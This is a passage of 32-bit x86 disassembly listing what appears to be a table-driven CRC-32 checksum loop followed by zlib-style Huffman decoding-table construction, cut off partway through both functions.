  4087e7:	0f b6 d0             	movzbl %al,%edx
  4087ea:	0f b6 c4             	movzbl %ah,%eax
  4087ed:	8b 14 95 c0 ec 40 00 	mov    0x40ecc0(,%edx,4),%edx
  4087f4:	33 14 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edx
  4087fb:	33 51 10             	xor    0x10(%ecx),%edx
  4087fe:	33 14 85 c0 e8 40 00 	xor    0x40e8c0(,%eax,4),%edx
  408805:	33 14 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%edx
  40880c:	89 d0                	mov    %edx,%eax
  40880e:	89 d5                	mov    %edx,%ebp
  408810:	c1 e8 10             	shr    $0x10,%eax
  408813:	c1 ed 18             	shr    $0x18,%ebp
  408816:	0f b6 f8             	movzbl %al,%edi
  408819:	0f b6 c2             	movzbl %dl,%eax
  40881c:	0f b6 d6             	movzbl %dh,%edx
  40881f:	8b 04 85 c0 ec 40 00 	mov    0x40ecc0(,%eax,4),%eax
  408826:	33 04 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%eax
  40882d:	33 41 14             	xor    0x14(%ecx),%eax
  408830:	33 04 95 c0 e8 40 00 	xor    0x40e8c0(,%edx,4),%eax
  408837:	33 04 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%eax
  40883e:	89 c5                	mov    %eax,%ebp
  408840:	89 c2                	mov    %eax,%edx
  408842:	0f b6 f8             	movzbl %al,%edi
  408845:	c1 ed 18             	shr    $0x18,%ebp
  408848:	c1 ea 10             	shr    $0x10,%edx
  40884b:	8b 3c bd c0 ec 40 00 	mov    0x40ecc0(,%edi,4),%edi
  408852:	33 3c ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edi
  408859:	0f b6 c4             	movzbl %ah,%eax
  40885c:	0f b6 d2             	movzbl %dl,%edx
  40885f:	33 79 18             	xor    0x18(%ecx),%edi
  408862:	8b 1c 95 c0 e4 40 00 	mov    0x40e4c0(,%edx,4),%ebx
  408869:	83 c1 20             	add    $0x20,%ecx
  40886c:	33 3c 85 c0 e8 40 00 	xor    0x40e8c0(,%eax,4),%edi
  408873:	83 ee 20             	sub    $0x20,%esi
  408876:	31 fb                	xor    %edi,%ebx
  408878:	89 dd                	mov    %ebx,%ebp
  40887a:	0f b6 d3             	movzbl %bl,%edx
  40887d:	89 d8                	mov    %ebx,%eax
  40887f:	c1 ed 18             	shr    $0x18,%ebp
  408882:	8b 14 95 c0 ec 40 00 	mov    0x40ecc0(,%edx,4),%edx
  408889:	c1 e8 10             	shr    $0x10,%eax
  40888c:	33 14 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edx
  408893:	0f b6 ff             	movzbl %bh,%edi
  408896:	0f b6 c0             	movzbl %al,%eax
  408899:	33 51 fc             	xor    -0x4(%ecx),%edx
  40889c:	33 14 bd c0 e8 40 00 	xor    0x40e8c0(,%edi,4),%edx
  4088a3:	33 14 85 c0 e4 40 00 	xor    0x40e4c0(,%eax,4),%edx
  4088aa:	89 d0                	mov    %edx,%eax
  4088ac:	0f b6 ea             	movzbl %dl,%ebp
  4088af:	c1 e8 10             	shr    $0x10,%eax
  4088b2:	0f b6 f8             	movzbl %al,%edi
  4088b5:	89 d0                	mov    %edx,%eax
  4088b7:	0f b6 d6             	movzbl %dh,%edx
  4088ba:	c1 e8 18             	shr    $0x18,%eax
  4088bd:	8b 04 85 c0 e0 40 00 	mov    0x40e0c0(,%eax,4),%eax
  4088c4:	33 04 ad c0 ec 40 00 	xor    0x40ecc0(,%ebp,4),%eax
  4088cb:	33 04 95 c0 e8 40 00 	xor    0x40e8c0(,%edx,4),%eax
  4088d2:	33 04 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%eax
  4088d9:	83 fe 1f             	cmp    $0x1f,%esi
  4088dc:	0f 87 5e fe ff ff    	ja     0x408740
  4088e2:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4088e6:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4088ea:	83 64 24 1c 1f       	andl   $0x1f,0x1c(%esp)
  4088ef:	8d 56 e0             	lea    -0x20(%esi),%edx
  4088f2:	83 e2 e0             	and    $0xffffffe0,%edx
  4088f5:	8d 5c 13 20          	lea    0x20(%ebx,%edx,1),%ebx
  4088f9:	83 7c 24 1c 03       	cmpl   $0x3,0x1c(%esp)
  4088fe:	0f 86 85 00 00 00    	jbe    0x408989
  408904:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  408908:	8d 56 fc             	lea    -0x4(%esi),%edx
  40890b:	c1 ea 02             	shr    $0x2,%edx
  40890e:	8d 4c 93 04          	lea    0x4(%ebx,%edx,4),%ecx
  408912:	83 c3 04             	add    $0x4,%ebx
  408915:	33 43 fc             	xor    -0x4(%ebx),%eax
  408918:	89 c2                	mov    %eax,%edx
  40891a:	89 c6                	mov    %eax,%esi
  40891c:	c1 ea 10             	shr    $0x10,%edx
  40891f:	c1 ee 18             	shr    $0x18,%esi
  408922:	0f b6 fa             	movzbl %dl,%edi
  408925:	0f b6 d0             	movzbl %al,%edx
  408928:	8b 34 b5 c0 e0 40 00 	mov    0x40e0c0(,%esi,4),%esi
  40892f:	33 34 95 c0 ec 40 00 	xor    0x40ecc0(,%edx,4),%esi
  408936:	0f b6 d4             	movzbl %ah,%edx
  408939:	8b 04 95 c0 e8 40 00 	mov    0x40e8c0(,%edx,4),%eax
  408940:	31 f0                	xor    %esi,%eax
  408942:	33 04 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%eax
  408949:	39 cb                	cmp    %ecx,%ebx
  40894b:	75 c5                	jne    0x408912
  40894d:	83 64 24 1c 03       	andl   $0x3,0x1c(%esp)
  408952:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  408956:	85 d2                	test   %edx,%edx
  408958:	0f 84 b1 fd ff ff    	je     0x40870f
  40895e:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  408962:	01 ca                	add    %ecx,%edx
  408964:	83 c1 01             	add    $0x1,%ecx
  408967:	89 c3                	mov    %eax,%ebx
  408969:	c1 e8 08             	shr    $0x8,%eax
  40896c:	32 59 ff             	xor    -0x1(%ecx),%bl
  40896f:	0f b6 db             	movzbl %bl,%ebx
  408972:	33 04 9d c0 e0 40 00 	xor    0x40e0c0(,%ebx,4),%eax
  408979:	39 d1                	cmp    %edx,%ecx
  40897b:	75 e7                	jne    0x408964
  40897d:	e9 8d fd ff ff       	jmp    0x40870f
  408982:	5b                   	pop    %ebx
  408983:	31 c0                	xor    %eax,%eax
  408985:	5e                   	pop    %esi
  408986:	5f                   	pop    %edi
  408987:	5d                   	pop    %ebp
  408988:	c3                   	ret
  408989:	89 d9                	mov    %ebx,%ecx
  40898b:	eb c5                	jmp    0x408952
  40898d:	8d 76 00             	lea    0x0(%esi),%esi
  408990:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  408994:	8b 54 24 08          	mov    0x8(%esp),%edx
  408998:	8b 44 24 04          	mov    0x4(%esp),%eax
  40899c:	e9 0f fc ff ff       	jmp    0x4085b0
  4089a1:	eb 0d                	jmp    0x4089b0
  4089a3:	90                   	nop
  4089a4:	90                   	nop
  4089a5:	90                   	nop
  4089a6:	90                   	nop
  4089a7:	90                   	nop
  4089a8:	90                   	nop
  4089a9:	90                   	nop
  4089aa:	90                   	nop
  4089ab:	90                   	nop
  4089ac:	90                   	nop
  4089ad:	90                   	nop
  4089ae:	90                   	nop
  4089af:	90                   	nop
  4089b0:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4089b4:	8b 54 24 08          	mov    0x8(%esp),%edx
  4089b8:	8b 44 24 04          	mov    0x4(%esp),%eax
  4089bc:	e9 ef fb ff ff       	jmp    0x4085b0
  4089c1:	90                   	nop
  4089c2:	90                   	nop
  4089c3:	90                   	nop
  4089c4:	90                   	nop
  4089c5:	90                   	nop
  4089c6:	90                   	nop
  4089c7:	90                   	nop
  4089c8:	90                   	nop
  4089c9:	90                   	nop
  4089ca:	90                   	nop
  4089cb:	90                   	nop
  4089cc:	90                   	nop
  4089cd:	90                   	nop
  4089ce:	90                   	nop
  4089cf:	90                   	nop
  4089d0:	55                   	push   %ebp
  4089d1:	57                   	push   %edi
  4089d2:	56                   	push   %esi
  4089d3:	53                   	push   %ebx
  4089d4:	81 ec 84 00 00 00    	sub    $0x84,%esp
  4089da:	8d 44 24 44          	lea    0x44(%esp),%eax
  4089de:	8d 5c 24 64          	lea    0x64(%esp),%ebx
  4089e2:	31 ed                	xor    %ebp,%ebp
  4089e4:	83 c0 02             	add    $0x2,%eax
  4089e7:	66 89 68 fe          	mov    %bp,-0x2(%eax)
  4089eb:	39 d8                	cmp    %ebx,%eax
  4089ed:	75 f3                	jne    0x4089e2
  4089ef:	8b bc 24 a0 00 00 00 	mov    0xa0(%esp),%edi
  4089f6:	8b 84 24 9c 00 00 00 	mov    0x9c(%esp),%eax
  4089fd:	85 ff                	test   %edi,%edi
  4089ff:	8d 0c 78             	lea    (%eax,%edi,2),%ecx
  408a02:	74 10                	je     0x408a14
  408a04:	0f b7 10             	movzwl (%eax),%edx
  408a07:	83 c0 02             	add    $0x2,%eax
  408a0a:	66 83 44 54 44 01    	addw   $0x1,0x44(%esp,%edx,2)
  408a10:	39 c8                	cmp    %ecx,%eax
  408a12:	75 f0                	jne    0x408a04
  408a14:	8b 84 24 a8 00 00 00 	mov    0xa8(%esp),%eax
  408a1b:	8b 10                	mov    (%eax),%edx
  408a1d:	b8 0f 00 00 00       	mov    $0xf,%eax
  408a22:	66 83 7c 44 44 00    	cmpw   $0x0,0x44(%esp,%eax,2)
  408a28:	0f 85 bd 04 00 00    	jne    0x408eeb
  408a2e:	83 e8 01             	sub    $0x1,%eax
  408a31:	75 ef                	jne    0x408a22
  408a33:	85 d2                	test   %edx,%edx
  408a35:	0f 84 95 01 00 00    	je     0x408bd0
  408a3b:	89 44 24 20          	mov    %eax,0x20(%esp)
  408a3f:	8b 74 24 20          	mov    0x20(%esp),%esi
  408a43:	85 f6                	test   %esi,%esi
  408a45:	0f 84 85 01 00 00    	je     0x408bd0
  408a4b:	83 fe 01             	cmp    $0x1,%esi
  408a4e:	0f b7 7c 24 46       	movzwl 0x46(%esp),%edi
  408a53:	bd 01 00 00 00       	mov    $0x1,%ebp
  408a58:	76 1a                	jbe    0x408a74
  408a5a:	66 85 ff             	test   %di,%di
  408a5d:	75 15                	jne    0x408a74
  408a5f:	8b 54 24 20          	mov    0x20(%esp),%edx
  408a63:	eb 08                	jmp    0x408a6d
  408a65:	66 83 7c 6c 44 00    	cmpw   $0x0,0x44(%esp,%ebp,2)
  408a6b:	75 07                	jne    0x408a74
  408a6d:	83 c5 01             	add    $0x1,%ebp
  408a70:	39 d5                	cmp    %edx,%ebp
  408a72:	75 f1                	jne    0x408a65
  408a74:	8d 74 24 48          	lea    0x48(%esp),%esi
  408a78:	0f b7 cf             	movzwl %di,%ecx
  408a7b:	ba 01 00 00 00       	mov    $0x1,%edx
  408a80:	eb 06                	jmp    0x408a88
  408a82:	0f b7 0e             	movzwl (%esi),%ecx
  408a85:	83 c6 02             	add    $0x2,%esi
  408a88:	01 d2                	add    %edx,%edx
  408a8a:	29 ca                	sub    %ecx,%edx
  408a8c:	0f 88 6c 04 00 00    	js     0x408efe
  408a92:	39 f3                	cmp    %esi,%ebx
  408a94:	75 ec                	jne    0x408a82
  408a96:	85 d2                	test   %edx,%edx
  408a98:	74 1a                	je     0x408ab4
  408a9a:	83 7c 24 20 01       	cmpl   $0x1,0x20(%esp)
  408a9f:	0f 85 59 04 00 00    	jne    0x408efe
  408aa5:	8b 8c 24 98 00 00 00 	mov    0x98(%esp),%ecx
  408aac:	85 c9                	test   %ecx,%ecx
  408aae:	0f 84 4a 04 00 00    	je     0x408efe
  408ab4:	31 d2                	xor    %edx,%edx
  408ab6:	31 c9                	xor    %ecx,%ecx
  408ab8:	66 89 54 24 66       	mov    %dx,0x66(%esp)
  408abd:	ba 01 00 00 00       	mov    $0x1,%edx
  408ac2:	eb 05                	jmp    0x408ac9
  408ac4:	0f b7 7c 54 44       	movzwl 0x44(%esp,%edx,2),%edi
  408ac9:	83 c2 01             	add    $0x1,%edx
  408acc:	01 f9                	add    %edi,%ecx
  408ace:	83 fa 0f             	cmp    $0xf,%edx
  408ad1:	66 89 0c 53          	mov    %cx,(%ebx,%edx,2)
  408ad5:	75 ed                	jne    0x408ac4
  408ad7:	8b b4 24 a0 00 00 00 	mov    0xa0(%esp),%esi
  408ade:	31 d2                	xor    %edx,%edx
  408ae0:	85 f6                	test   %esi,%esi
  408ae2:	74 44                	je     0x408b28
  408ae4:	89 2c 24             	mov    %ebp,(%esp)
  408ae7:	89 44 24 04          	mov    %eax,0x4(%esp)
  408aeb:	8b bc 24 9c 00 00 00 	mov    0x9c(%esp),%edi
  408af2:	8b ac 24 a0 00 00 00 	mov    0xa0(%esp),%ebp
  408af9:	8b 84 24 ac 00 00 00 	mov    0xac(%esp),%eax
  408b00:	0f b7 0c 57          	movzwl (%edi,%edx,2),%ecx
  408b04:	66 85 c9             	test   %cx,%cx
  408b07:	74 11                	je     0x408b1a
  408b09:	0f b7 5c 4c 64       	movzwl 0x64(%esp,%ecx,2),%ebx
  408b0e:	8d 73 01             	lea    0x1(%ebx),%esi
  408b11:	66 89 14 58          	mov    %dx,(%eax,%ebx,2)
  408b15:	66 89 74 4c 64       	mov    %si,0x64(%esp,%ecx,2)
  408b1a:	83 c2 01             	add    $0x1,%edx
  408b1d:	39 ea                	cmp    %ebp,%edx
  408b1f:	75 df                	jne    0x408b00
  408b21:	8b 2c 24             	mov    (%esp),%ebp
  408b24:	8b 44 24 04          	mov    0x4(%esp),%eax
  408b28:	8b 9c 24 98 00 00 00 	mov    0x98(%esp),%ebx
  408b2f:	85 db                	test   %ebx,%ebx
  408b31:	0f 84 e9 00 00 00    	je     0x408c20
  408b37:	83 bc 24 98 00 00 00 	cmpl   $0x1,0x98(%esp)
  408b3e:	01 
  408b3f:	b9 00 01 00 00       	mov    $0x100,%ecx
  408b44:	ba ff ff ff ff       	mov    $0xffffffff,%edx
  408b49:	0f 44 d1             	cmove  %ecx,%edx
  408b4c:	b9 3e ff 40 00       	mov    $0x40ff3e,%ecx
  408b51:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  408b55:	ba c0 00 41 00       	mov    $0x4100c0,%edx
  408b5a:	0f 44 d1             	cmove  %ecx,%edx
  408b5d:	b9 7e ff 40 00       	mov    $0x40ff7e,%ecx
  408b62:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  408b66:	ba 00 01 41 00       	mov    $0x410100,%edx
  408b6b:	0f 44 d1             	cmove  %ecx,%edx
  408b6e:	39 c5                	cmp    %eax,%ebp
  408b70:	0f 43 c5             	cmovae %ebp,%eax
  408b73:	89 54 24 38          	mov    %edx,0x38(%esp)
  408b77:	89 c3                	mov    %eax,%ebx
  408b79:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  408b7d:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408b84:	89 d9                	mov    %ebx,%ecx
  408b86:	8b 00                	mov    (%eax),%eax
  408b88:	89 44 24 14          	mov    %eax,0x14(%esp)
  408b8c:	b8 01 00 00 00       	mov    $0x1,%eax
  408b91:	d3 e0                	shl    %cl,%eax
  408b93:	83 bc 24 98 00 00 00 	cmpl   $0x1,0x98(%esp)
  408b9a:	01 
  408b9b:	0f 94 44 24 43       	sete   0x43(%esp)
  408ba0:	3d 54 03 00 00       	cmp    $0x354,%eax
  408ba5:	0f 86 b2 00 00 00    	jbe    0x408c5d
  408bab:	80 7c 24 43 00       	cmpb   $0x0,0x43(%esp)
  408bb0:	0f 84 a7 00 00 00    	je     0x408c5d
  408bb6:	81 c4 84 00 00 00    	add    $0x84,%esp
  408bbc:	b8 01 00 00 00       	mov    $0x1,%eax
  408bc1:	5b                   	pop    %ebx
  408bc2:	5e                   	pop    %esi
  408bc3:	5f                   	pop    %edi
  408bc4:	5d                   	pop    %ebp
  408bc5:	c3                   	ret
  408bc6:	8d 76 00             	lea    0x0(%esi),%esi
  408bc9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408bd0:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408bd7:	8b 9c 24 a4 00 00 00 	mov    0xa4(%esp),%ebx
  408bde:	31 f6                	xor    %esi,%esi
  408be0:	31 ff                	xor    %edi,%edi
  408be2:	8b 00                	mov    (%eax),%eax
  408be4:	8d 50 04             	lea    0x4(%eax),%edx
  408be7:	89 13                	mov    %edx,(%ebx)
  408be9:	c6 00 40             	movb   $0x40,(%eax)
  408bec:	c6 40 01 01          	movb   $0x1,0x1(%eax)
  408bf0:	66 89 70 02          	mov    %si,0x2(%eax)
  408bf4:	8b 03                	mov    (%ebx),%eax
  408bf6:	8d 50 04             	lea    0x4(%eax),%edx
  408bf9:	89 13                	mov    %edx,(%ebx)
  408bfb:	c6 00 40             	movb   $0x40,(%eax)
  408bfe:	c6 40 01 01          	movb   $0x1,0x1(%eax)
  408c02:	66 89 78 02          	mov    %di,0x2(%eax)
  408c06:	8b 84 24 a8 00 00 00 	mov    0xa8(%esp),%eax
  408c0d:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  408c13:	31 c0                	xor    %eax,%eax
  408c15:	81 c4 84 00 00 00    	add    $0x84,%esp
  408c1b:	5b                   	pop    %ebx
  408c1c:	5e                   	pop    %esi
  408c1d:	5f                   	pop    %edi
  408c1e:	5d                   	pop    %ebp
  408c1f:	c3                   	ret
  408c20:	39 c5                	cmp    %eax,%ebp
  408c22:	c6 44 24 43 00       	movb   $0x0,0x43(%esp)
  408c27:	c7 44 24 2c 13 00 00 	movl   $0x13,0x2c(%esp)
  408c2e:	00 
  408c2f:	0f 43 c5             	cmovae %ebp,%eax
  408c32:	89 c3                	mov    %eax,%ebx
  408c34:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  408c38:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408c3f:	89 d9                	mov    %ebx,%ecx
  408c41:	8b 9c 24 ac 00 00 00 	mov    0xac(%esp),%ebx
  408c48:	8b 00                	mov    (%eax),%eax
  408c4a:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  408c4e:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  408c52:	89 44 24 14          	mov    %eax,0x14(%esp)
  408c56:	b8 01 00 00 00       	mov    $0x1,%eax
  408c5b:	d3 e0                	shl    %cl,%eax
  408c5d:	83 bc 24 98 00 00 00 	cmpl   $0x2,0x98(%esp)
  408c64:	02 
  408c65:	0f 94 44 24 42       	sete   0x42(%esp)
  408c6a:	3d 50 02 00 00       	cmp    $0x250,%eax
  408c6f:	0f b6 5c 24 42       	movzbl 0x42(%esp),%ebx
  408c74:	76 08                	jbe    0x408c7e
  408c76:	84 db                	test   %bl,%bl
  408c78:	0f 85 38 ff ff ff    	jne    0x408bb6
  408c7e:	8b 9c 24 ac 00 00 00 	mov    0xac(%esp),%ebx
  408c85:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  408c89:	89 44 24 24          	mov    %eax,0x24(%esp)
  408c8d:	83 e8 01             	sub    $0x1,%eax
  408c90:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  408c94:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%esp)
  408c9b:	ff 
  408c9c:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  408ca3:	00 
  408ca4:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  408ca8:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  408caf:	00 
  408cb0:	89 fd                	mov    %edi,%ebp
  408cb2:	89 44 24 34          	mov    %eax,0x34(%esp)
  408cb6:	8d 76 00             	lea    0x0(%esi),%esi
  408cb9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408cc0:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  408cc5:	c6 44 24 40 00       	movb   $0x0,0x40(%esp)
  408cca:	2a 44 24 0c          	sub    0xc(%esp),%al
  408cce:	88 44 24 41          	mov    %al,0x41(%esp)
  408cd2:	8b 44 24 10          	mov    0x10(%esp),%eax
  408cd6:	0f b7 00             	movzwl (%eax),%eax
  408cd9:	39 44 24 2c          	cmp    %eax,0x2c(%esp)
  408cdd:	89 c7                	mov    %eax,%edi
  408cdf:	7f 1a                	jg     0x408cfb
  408ce1:	0f 8d 39 02 00 00    	jge    0x408f20
  408ce7:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  408ceb:	0f b6 1c 43          	movzbl (%ebx,%eax,2),%ebx
  408cef:	88 5c 24 40          	mov    %bl,0x40(%esp)
  408cf3:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  408cf7:	0f b7 3c 43          	movzwl (%ebx,%eax,2),%edi
  408cfb:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  408cff:	2b 4c 24 0c          	sub    0xc(%esp),%ecx
  408d03:	ba 01 00 00 00       	mov    $0x1,%edx
  408d08:	b8 01 00 00 00       	mov    $0x1,%eax
  408d0d:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  408d11:	d3 e2                	shl    %cl,%edx
  408d13:	89 e9                	mov    %ebp,%ecx
  408d15:	0f b6 6c 24 40       	movzbl 0x40(%esp),%ebp
  408d1a:	d3 e0                	shl    %cl,%eax
  408d1c:	0f b6 4c 24 0c       	movzbl 0xc(%esp),%ecx
  408d21:	8d 34 95 00 00 00 00 	lea    0x0(,%edx,4),%esi
  408d28:	89 c3                	mov    %eax,%ebx
  408d2a:	89 44 24 28          	mov    %eax,0x28(%esp)
  408d2e:	8b 44 24 08          	mov    0x8(%esp),%eax
  408d32:	f7 de                	neg    %esi
  408d34:	89 14 24             	mov    %edx,(%esp)
  408d37:	d3 e8                	shr    %cl,%eax
  408d39:	89 d9                	mov    %ebx,%ecx
  408d3b:	01 d8                	add    %ebx,%eax
  408d3d:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  408d41:	29 d0                	sub    %edx,%eax
  408d43:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  408d46:	0f b6 5c 24 41       	movzbl 0x41(%esp),%ebx
  408d4b:	90                   	nop
  408d4c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  408d50:	89 ea                	mov    %ebp,%edx
  408d52:	88 58 01             	mov    %bl,0x1(%eax)
  408d55:	66 89 78 02          	mov    %di,0x2(%eax)
  408d59:	88 10                	mov    %dl,(%eax)
  408d5b:	01 f0                	add    %esi,%eax
  408d5d:	2b 0c 24             	sub    (%esp),%ecx
  408d60:	75 ee                	jne    0x408d50
  408d62:	8b 44 24 04          	mov    0x4(%esp),%eax
  408d66:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  408d6a:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  408d6e:	8d 48 ff             	lea    -0x1(%eax),%ecx
  408d71:	b8 01 00 00 00       	mov    $0x1,%eax
  408d76:	d3 e0                	shl    %cl,%eax
  408d78:	85 c3                	test   %eax,%ebx
  408d7a:	74 0a                	je     0x408d86
  408d7c:	89 da                	mov    %ebx,%edx
  408d7e:	66 90                	xchg   %ax,%ax
  408d80:	d1 e8                	shr    $1,%eax
  408d82:	85 c2                	test   %eax,%edx
  408d84:	75 fa                	jne    0x408d80
  408d86:	85 c0                	test   %eax,%eax
  408d88:	0f 84 82 01 00 00    	je     0x408f10
  408d8e:	8d 50 ff             	lea    -0x1(%eax),%edx
  408d91:	23 54 24 08          	and    0x8(%esp),%edx
  408d95:	01 d0                	add    %edx,%eax
  408d97:	89 44 24 08          	mov    %eax,0x8(%esp)
  408d9b:	8b 74 24 04          	mov    0x4(%esp),%esi
  408d9f:	0f b7 44 74 44       	movzwl 0x44(%esp,%esi,2),%eax
  408da4:	66 89 04 24          	mov    %ax,(%esp)
  408da8:	83 e8 01             	sub    $0x1,%eax
  408dab:	66 85 c0             	test   %ax,%ax
  408dae:	66 89 44 74 44       	mov    %ax,0x44(%esp,%esi,2)
  408db3:	75 23                	jne    0x408dd8
  408db5:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  408db9:	39 de                	cmp    %ebx,%esi
  408dbb:	0f 84 6b 01 00 00    	je     0x408f2c
  408dc1:	8b 44 24 10          	mov    0x10(%esp),%eax
  408dc5:	8b bc 24 9c 00 00 00 	mov    0x9c(%esp),%edi
  408dcc:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  408dd0:	0f b7 04 47          	movzwl (%edi,%eax,2),%eax
  408dd4:	89 44 24 04          	mov    %eax,0x4(%esp)
  408dd8:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  408ddc:	39 5c 24 04          	cmp    %ebx,0x4(%esp)
  408de0:	0f 86 fb 00 00 00    	jbe    0x408ee1
  408de6:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  408dea:	23 5c 24 34          	and    0x34(%esp),%ebx
  408dee:	3b 5c 24 30          	cmp    0x30(%esp),%ebx
  408df2:	0f 84 e9 00 00 00    	je     0x408ee1
  408df8:	8b 44 24 0c          	mov    0xc(%esp),%eax
  408dfc:	8b 7c 24 14          	mov    0x14(%esp),%edi
  408e00:	8b 74 24 28          	mov    0x28(%esp),%esi
  408e04:	85 c0                	test   %eax,%eax
  408e06:	0f 44 44 24 1c       	cmove  0x1c(%esp),%eax
  408e0b:	8d 3c b7             	lea    (%edi,%esi,4),%edi
  408e0e:	8b 74 24 04          	mov    0x4(%esp),%esi
  408e12:	89 7c 24 14          	mov    %edi,0x14(%esp)
  408e16:	89 f5                	mov    %esi,%ebp
  408e18:	89 44 24 0c          	mov    %eax,0xc(%esp)
  408e1c:	89 c7                	mov    %eax,%edi
  408e1e:	29 c5                	sub    %eax,%ebp
  408e20:	b8 01 00 00 00       	mov    $0x1,%eax
  408e25:	89 e9                	mov    %ebp,%ecx
  408e27:	d3 e0                	shl    %cl,%eax
  408e29:	89 f1                	mov    %esi,%ecx
  408e2b:	8b 74 24 20          	mov    0x20(%esp),%esi
  408e2f:	39 f1                	cmp    %esi,%ecx
  408e31:	73 33                	jae    0x408e66
  408e33:	0f b7 54 4c 44       	movzwl 0x44(%esp,%ecx,2),%edx
  408e38:	29 d0                	sub    %edx,%eax
  408e3a:	85 c0                	test   %eax,%eax
  408e3c:	7e 28                	jle    0x408e66
  408e3e:	8d 4c 7c 44          	lea    0x44(%esp,%edi,2),%ecx
  408e42:	89 fa                	mov    %edi,%edx
  408e44:	eb 14                	jmp    0x408e5a
  408e46:	8d 76 00             	lea    0x0(%esi),%esi
  408e49:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408e50:	0f b7 3c 69          	movzwl (%ecx,%ebp,2),%edi
  408e54:	29 f8                	sub    %edi,%eax
  408e56:	85 c0                	test   %eax,%eax
  408e58:	7e 0c                	jle    0x408e66
  408e5a:	83 c5 01             	add    $0x1,%ebp
  408e5d:	01 c0                	add    %eax,%eax
  408e5f:	8d 3c 2a             	lea    (%edx,%ebp,1),%edi
  408e62:	39 fe                	cmp    %edi,%esi
  408e64:	77 ea                	ja     0x408e50
  408e66:	b8 01 00 00 00       	mov    $0x1,%eax
  408e6b:	89 e9                	mov    %ebp,%ecx
  408e6d:	d3 e0                	shl    %cl,%eax
  408e6f:	01 44 24 24          	add    %eax,0x24(%esp)
  408e73:	8b 74 24 24          	mov    0x24(%esp),%esi
  408e77:	81 fe 54 03 00 00    	cmp    $0x354,%esi
  408e7d:	76 0b                	jbe    0x408e8a
  408e7f:	80 7c 24 43 00       	cmpb   $0x0,0x43(%esp)
  408e84:	0f 85 2c fd ff ff    	jne    0x408bb6
  408e8a:	81 7c 24 24 50 02 00 	cmpl   $0x250,0x24(%esp)
  408e91:	00 
  408e92:	76 0b                	jbe    0x408e9f
  408e94:	80 7c 24 42 00       	cmpb   $0x0,0x42(%esp)
  408e99:	0f 85 17 fd ff ff    	jne    0x408bb6
  408e9f:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408ea6:	89 e9                	mov    %ebp,%ecx
  408ea8:	8d 14 9d 00 00 00 00 	lea    0x0(,%ebx,4),%edx
  408eaf:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  408eb3:	8b 00                	mov    (%eax),%eax
  408eb5:	88 0c 98             	mov    %cl,(%eax,%ebx,4)
  408eb8:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408ebf:	0f b6 4c 24 1c       	movzbl 0x1c(%esp),%ecx
  408ec4:	8b 00                	mov    (%eax),%eax
  408ec6:	88 4c 10 01          	mov    %cl,0x1(%eax,%edx,1)
  408eca:	8b 84 24 a4 00 00 00 	mov    0xa4(%esp),%eax
  408ed1:	8b 08                	mov    (%eax),%ecx
  408ed3:	8b 44 24 14          	mov    0x14(%esp),%eax
  408ed7:	29 c8                	sub    %ecx,%eax
  408ed9:	c1 f8 02             	sar    $0x2,%eax
  408edc:	66 89 44 11 02       	mov    %ax,0x2(%ecx,%edx,1)
  408ee1:	83 44 24 10 02       	addl   $0x2,0x10(%esp)
  408ee6:	e9 d5 fd ff ff       	jmp    0x408cc0
  408eeb:	39 c2                	cmp    %eax,%edx
  408eed:	0f 87 48 fb ff ff    	ja     0x408a3b
  408ef3:	89 44 24 20          	mov    %eax,0x20(%esp)
  408ef7:	89 d0                	mov    %edx,%eax
  408ef9:	e9 41 fb ff ff       	jmp    0x408a3f
  408efe:	81 c4 84 00 00 00    	add    $0x84,%esp
  408f04:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  408f09:	5b                   	pop    %ebx
  408f0a:	5e                   	pop    %esi
  408f0b:	5f                   	pop    %edi
